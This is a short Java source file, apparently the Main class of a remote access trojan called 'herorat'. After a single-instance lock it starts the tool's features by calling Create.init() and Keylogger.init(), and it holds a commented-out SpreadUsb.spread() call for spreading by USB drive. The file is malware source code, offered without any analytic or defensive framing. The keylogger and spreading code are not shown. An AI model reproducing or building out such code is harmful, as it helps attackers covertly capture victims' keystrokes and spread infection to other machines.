package net.herorat;

import java.util.Date;

import javax.swing.UIManager;

import net.herorat.features.create.Create;
import net.herorat.features.keylogger.Keylogger;
import net.herorat.utils.Lock;


public class Main
{
	public static long start_time = new Date().getTime();
	
	public static void init()
	{
		Create.init();
		Keylogger.init();
		//SpreadUsb.spread();
	}
	
	public static void main(String[] args) throws Exception
	{
		try
		{
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
 			UIManager.put("AuditoryCues.playList", UIManager.get("AuditoryCues.allAuditoryCues"));
			new Lock();
		}
		catch(RuntimeException ex)
		{
			javax.swing.JOptionPane.showMessageDialog(null, "This program is already running!");
			System.exit(0);
		}
		catch (Exception e) {}
		
		Main.init();
	}
}